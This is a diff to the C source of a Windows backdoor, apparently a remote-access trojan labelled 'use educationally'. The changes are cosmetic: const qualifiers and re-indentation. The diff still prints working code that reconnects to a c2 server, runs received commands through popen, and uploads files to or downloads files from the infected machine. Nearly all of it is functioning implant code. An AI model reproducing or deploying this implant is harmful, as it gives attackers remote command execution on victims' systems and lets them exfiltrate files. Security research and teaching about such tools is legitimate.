@@ -15,7 +15,7 @@ Use educationally/legally.
 
 
 // Function to create connect socket.
-SOCKET create_socket() {
+const SOCKET create_socket() {
 	// Initialize winsock
 	WSADATA wsData;
 	WORD ver = MAKEWORD(2, 2);
@@ -25,7 +25,7 @@ SOCKET create_socket() {
 	}
 
 	// Create socket and hint structure
-	SOCKET connect_socket = socket(AF_INET, SOCK_STREAM, 0);
+	const SOCKET connect_socket = socket(AF_INET, SOCK_STREAM, 0);
 	if (connect_socket == INVALID_SOCKET) {
 		WSACleanup();
 		return connect_socket;
@@ -35,7 +35,7 @@ SOCKET create_socket() {
 }
 
 // Function to connect the connect socket to c2 server.
-int c2_connect(SOCKET connect_socket, const char* host, const int port) {
+int c2_connect(const SOCKET connect_socket, const char* host, const int port) {
 	struct sockaddr_in hint;
 	hint.sin_family = AF_INET;
 
@@ -61,7 +61,7 @@ inline uint32_t ntohl_conv(char* const buf) {
 }
 
 // Function to receive file from client (TCP file transfer).
-int recv_file(char* const buf, const char* filename, SOCKET connect_socket) {
+int recv_file(char* const buf, const char* filename, const SOCKET connect_socket) {
 	FILE* fd = fopen(filename, "wb");
 
 	// Receive file size.
@@ -87,7 +87,7 @@ int recv_file(char* const buf, const char* filename, SOCKET connect_socket) {
 }
 
 // Function for sending file to client (TCP file transfer).
-int send_file(const char* filename, SOCKET connect_socket, char* const buf) {
+int send_file(const char* filename, const SOCKET connect_socket, char* const buf) {
 	// Open file.
 	FILE* fd = fopen(filename, "rb");
 
@@ -130,7 +130,7 @@ int send_file(const char* filename, SOCKET connect_socket, char* const buf) {
 }
 
 // Function to execute command.
-int exec_cmd(SOCKET connect_socket, char* const buf) {
+int exec_cmd(const SOCKET connect_socket, char* const buf) {
 	// Call Popen to execute command(s) and read the process' output.
 	strcat(buf, " 2>&1");
 
@@ -185,7 +185,7 @@ int main(void) {
 
 	while (1) {
 		// Create the connect socket.
-		SOCKET connect_socket = create_socket();
+		const SOCKET connect_socket = create_socket();
 
 		/* If connected to c2 recursively loop to receive/parse c2 commands. If an error-
 			  occurs (connection lost, etc) break the loop and reconnect & restart loop. */
@@ -200,24 +200,24 @@ int main(void) {
 
 				// buf[0] is the command code and &buf[1] is the parsed data.
 				switch (buf[0]) {
-					case '0':
-						iResult = exec_cmd(connect_socket, &buf[1]);
-						break;
-					case '1':
-						// Change directory.
-						_chdir(&buf[1]);
-						break;
-					case '2':
-						// Exit.
-						return 0;
-					case '3':
-						// Upload file to client system.
-						iResult = recv_file(buf, &buf[1], connect_socket);
-						break;
-					case '4':
-						// Download file from client system.
-						iResult = send_file(&buf[1], connect_socket, buf);
-						break;
+				case '0':
+					iResult = exec_cmd(connect_socket, &buf[1]);
+					break;
+				case '1':
+					// Change directory.
+					_chdir(&buf[1]);
+					break;
+				case '2':
+					// Exit.
+					return 0;
+				case '3':
+					// Upload file to client system.
+					iResult = recv_file(buf, &buf[1], connect_socket);
+					break;
+				case '4':
+					// Download file from client system.
+					iResult = send_file(&buf[1], connect_socket, buf);
+					break;
 				}
 			}
 		}
